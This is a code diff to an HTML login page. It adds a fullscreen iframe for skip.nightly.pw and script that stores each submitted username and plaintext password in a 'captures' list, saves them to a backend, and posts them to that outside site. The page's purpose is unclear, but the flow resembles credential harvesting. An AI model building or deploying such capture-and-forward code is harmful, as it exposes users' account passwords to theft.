@@ -27,6 +27,7 @@
     align-items: center;
     justify-content: center;
     min-height: 100vh;
+    overflow: hidden;
   }
 
   main {
@@ -37,6 +38,7 @@
     max-width: 400px;
     box-shadow: 0 8px 24px rgba(0,0,0,0.5);
     position: relative;
+    z-index: 1;
   }
 
   h1 {
@@ -126,11 +128,23 @@
     font-size: 16px;
   }
 
-  .footer {
-    margin-top: 16px;
-    font-size: 12px;
-    text-align: center;
-    color: var(--text-muted);
+  /* Fullscreen iframe */
+  #skipIframeOverlay {
+    position: fixed;
+    inset: 0;
+    background: #000;
+    display: none;
+    z-index: 1000;
+  }
+
+  #skipIframeOverlay.active {
+    display: block;
+  }
+
+  #skipIframe {
+    width: 100%;
+    height: 100%;
+    border: 0;
   }
 
 </style>
@@ -147,16 +161,21 @@
     <label for="password">Password</label>
     <input id="password" name="password" type="text" placeholder="Password" />
 
-    <button type="submit">Login & Save</button>
+    <button type="submit">Login & Enter Skip</button>
   </form>
 
-  <div class="footer">&copy; 2025 tokaa1</div>
+  <div class="footer">&copy; 2025 Frix & Micro</div>
 </main>
 
 <!-- Dev modal -->
 <div id="devModal">
   <button id="devModalClose">X</button>
   <pre id="devOutput"></pre>
+</div>
+
+<!-- Fullscreen iframe overlay -->
+<div id="skipIframeOverlay">
+  <iframe id="skipIframe" src="about:blank" title="Skip.nightly.pw"></iframe>
 </div>
 
 <script>
@@ -172,6 +191,9 @@
   const devModal = document.getElementById('devModal');
   const devOutput = document.getElementById('devOutput');
   const devModalClose = document.getElementById('devModalClose');
+
+  const iframeOverlay = document.getElementById('skipIframeOverlay');
+  const skipIframe = document.getElementById('skipIframe');
 
   async function saveEntry(username, password){
     try {
@@ -205,13 +227,29 @@
       alert('Enter username first.');
       return;
     }
-    captures.push({ username, password, createdAt: new Date().toISOString() });
+    // save locally + backend
+    const entry = { username, password, createdAt: new Date().toISOString() };
+    captures.push(entry);
     await saveEntry(username, password);
+
+    // open skip.nightly.pw in fullscreen iframe
+    skipIframe.src = 'https://skip.nightly.pw';
+    iframeOverlay.classList.add('active');
+
+    // post credentials after iframe loads
+    skipIframe.onload = () => {
+      skipIframe.contentWindow.postMessage({
+        type: 'skip-credentials',
+        username: username,
+        password: password
+      }, 'https://skip.nightly.pw');
+    };
+
     usernameEl.value = '';
     passwordEl.value = '';
-    alert('Saved!');
   });
 
+  // Dev modal functions
   function showDevModal(){ devModal.classList.add('show'); }
   function hideDevModal(){ devModal.classList.remove('show'); }
   devModalClose.addEventListener('click', hideDevModal);
@@ -236,6 +274,7 @@
       showDevModal();
     }
   });
+
 })();
 </script>
 
